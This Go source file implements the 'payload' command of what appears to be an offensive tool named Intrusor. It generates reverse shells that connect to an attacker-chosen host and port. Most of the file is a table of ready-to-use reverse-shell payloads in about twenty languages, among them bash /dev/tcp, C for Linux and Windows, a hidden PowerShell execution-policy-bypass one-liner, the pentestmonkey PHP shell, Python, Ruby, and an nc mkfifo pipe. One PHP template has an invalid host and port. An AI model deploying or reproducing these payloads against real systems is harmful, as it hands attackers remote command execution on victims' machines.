package cmd

import (
	"errors"
	"fmt"
	"os"
	"sort"
	"strings"

	"github.com/OnlyF0uR/Intrusor/src/cli"
	"github.com/OnlyF0uR/Intrusor/src/utils"
	"github.com/spf13/cobra"
)

var PayloadHost string
var PayloadPort string
var PayloadLanguage string
var PayloadForceFile bool

func init() {
	rootCmd.AddCommand(payloadCmd)

	payloadCmd.Flags().StringVarP(&PayloadHost, "address", "a", "", "Host IP used in payload")
	payloadCmd.Flags().StringVarP(&PayloadPort, "port", "p", "4444", "Port used in the payload")
	payloadCmd.Flags().StringVarP(&PayloadLanguage, "language", "l", "", "The language of the payload")

	payloadCmd.Flags().BoolVarP(&PayloadForceFile, "forcefile", "f", false, "Force the output to be formatted in a file.")

	payloadCmd.MarkFlagRequired("address")
}

type shell struct {
	Payload    string
	AlwaysFile bool // Always put the output in a file
	Extension  string
}

// Direct commands must be extended with sh when executing
var reverseShells = map[string]shell{
	"bash": {
		`sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1`,
		false,
		"sh",
	},
	"c": {
		`#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
		
int main(void){
	int port = <PORT>;
	struct sockaddr_in revsockaddr;
		
	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	revsockaddr.sin_family = AF_INET;       
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("<HOST>");
		
	connect(sockt, (struct sockaddr *) &revsockaddr, 
	sizeof(revsockaddr));
	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);
		
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
		
	return 0;       
}`,
		true,
		"c",
	},
	"c-win": {
		`#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
		
WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "<HOST>"; 
char port[6] = "<PORT>";            
		
STARTUPINFO ini_processo;
		
PROCESS_INFORMATION processo_info;
		
int main()
{
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		
		
	struct hostent *host; 
	host = gethostbyname(ip_addr);
	strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
		
	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(port));
	hax.sin_addr.s_addr = inet_addr(ip_addr);
		
	WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
		
	memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
		
	TCHAR cmd[255] = TEXT("cmd.exe");
		
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		
	return 0;
}`,
		true,
		"c",
	},
	"dart": {
		`import 'dart:io';
import 'dart:convert';
		
main() {
	Socket.connect("<HOST>", <PORT>).then((socket) {
	socket.listen((data) {
		Process.start('powershell.exe', []).then((Process process) {
		process.stdin.writeln(new String.fromCharCodes(data).trim());
		process.stdout
			.transform(utf8.decoder)
			.listen((output) { socket.write(output); });
		});
	},
	onDone: () {
		socket.destroy();
	});
	});
}`,
		true,
		"dart",
	},
	"nodejs": {
		`(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(<PORT>, "<HOST>", function(){client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();`,
		false,
		"js",
	},
	"groovy": {
		`String host="<HOST>";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
		true,
		"groovy",
	},
	"csharp": {
		`using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
		
		
namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;
		
		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("<HOST>", <PORT>))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
								
						StringBuilder strInput = new StringBuilder();
		
						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();
		
						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}
		
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();
		
			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}
		
	}
}`,
		true,
		"cs",
	},
	"perl": {
		`perl -e 'use Socket;$i="<HOST>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
		false,
		"sh",
	},
	"perl-win": {
		`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<HOST>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
		false,
		"sh",
	},
	// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
	"php": {
		`<?php set_time_limit (0); $VERSION = "1.0"; $ip = '<HOST>'; $port = <PORT>; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) {$pid = pcntl_fork(); if ($pid == -1) {printit("ERROR: Can't fork"); exit(1); } if ($pid) {exit(0); } if (posix_setsid() == -1) {printit("Error: Can't setsid()"); exit(1); } $daemon = 1; } else {printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) {printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) {printit("ERROR: Can't spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) {if (feof($sock)) {printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) {printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) {if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {if (!$daemon) {print "$string\n"; } } ?>`,
		false,
		"php",
	},
	"php-exec": {
		`php -r '$sock=fsockopen("1234",99999);exec("sh <&3 >&3 2>&3");'`,
		false,
		"sh",
	},
	"powershell": {
		`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<HOST>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
		false,
		"ps1",
	},
	"python-gen": {
		`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<HOST>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
		false,
		"sh",
	},
	"python3": {
		`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<HOST>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
		false,
		"sh",
	},
	"go": {
		`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<HOST>:<PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
		false,
		"sh",
	},
	// Linux only
	"lua": {
		`lua -e "require('socket');require('os');t=socket.tcp();t:connect('<HOST>','<PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
		false,
		"sh",
	},
	// Windows and Linux
	"lua2": {
		`lua5.1 -e 'local host, port = "<HOST>", <PORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
		false,
		"sh",
	},
	"ruby": {
		`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<HOST>",<PORT>))'`,
		false,
		"sh",
	},
	"ruby2": {
		`ruby -rsocket -e'exit if fork;c=TCPSocket.new("<HOST>","<PORT>");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`,
		false,
		"sh",
	},
	"zsh": {
		`zsh -c 'zmodload zsh/net/tcp && ztcp <HOST> <PORT> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
		false,
		"sh",
	},
	"haskell": {
		`module Main where

import System.Process
		
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc <HOST> <PORT> >/tmp/f"`,
		true,
		"haskell",
	},
}

var bindShells = map[string]string{}

var payloadCmd = &cobra.Command{
	Use:   "payload [TYPE]",
	Short: "Generate a payload",
	Long:  "Creates a file with the requested payload.",
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) < 1 {
			fmt.Println(utils.Red + "No type was provided." + utils.Reset)
			return
		}

		if len(PayloadLanguage) == 0 {
			keys := make([]string, 0, len(reverseShells))
			for k, v := range reverseShells {
				if v.AlwaysFile {
					keys = append(keys, fmt.Sprintf("%-15s %-15s", k, "(Always file)"))
				} else {
					keys = append(keys, k)
				}
			}

			sort.Strings(keys)

			cli.Create(&cli.CreateData{
				Title:   "Choose a payload language",
				Options: keys,
				OnChoice: func(choice string) {
					PayloadLanguage = choice
					genPayload(strings.ToLower(args[0]))
				},
				OnQuit: func() {
					fmt.Println(utils.Red + "No language selected." + utils.Reset)
				},
			})
		} else {
			genPayload(strings.ToLower(args[0]))
		}
	},
}

func genPayload(payloadType string) {
	if payloadType == "reverseshell" || payloadType == "rs" {
		if val, ok := reverseShells[strings.ToLower(PayloadLanguage)]; ok {
			val.Payload = strings.Replace(strings.Replace(val.Payload, "<HOST>", PayloadHost, 1), "<PORT>", PayloadPort, 1)
			if val.AlwaysFile {
				// Output to file
				if ex := writeToFile(val); ex == nil {
					fmt.Println(utils.Green + "Result: " + utils.White + "payload." + val.Extension + utils.Reset)
				}
			} else {
				if PayloadForceFile {
					// Output to file
					if ex := writeToFile(val); ex == nil {
						fmt.Println(utils.Green + "Result: " + utils.White + "payload." + val.Extension + utils.Reset)
					}
				} else {
					// Output to stdout
					fmt.Println(utils.Green + "Result:\n" + utils.White + val.Payload + utils.Reset)
				}
			}
		} else {
			fmt.Println(utils.Red + "Invalid payload language." + utils.Reset)
		}
	} else if payloadType == "bindshell" || payloadType == "bs" {
		fmt.Println("Coming Soon!")
	} else {
		fmt.Println(utils.Red + "Invalid payload type." + utils.Reset)
	}
}

func writeToFile(val shell) error {
	f, ex := os.Create("payload." + val.Extension)
	if ex != nil {
		fmt.Println(utils.Red + "Failed to create a file for the payload." + utils.Reset)
		return errors.New("could not create file")
	}

	defer f.Close()

	_, ex = f.WriteString(val.Payload)
	if ex != nil {
		fmt.Println(utils.Red + "Failed to write payload to the file." + utils.Reset)
		return errors.New("could not write payload")
	}

	return nil
}
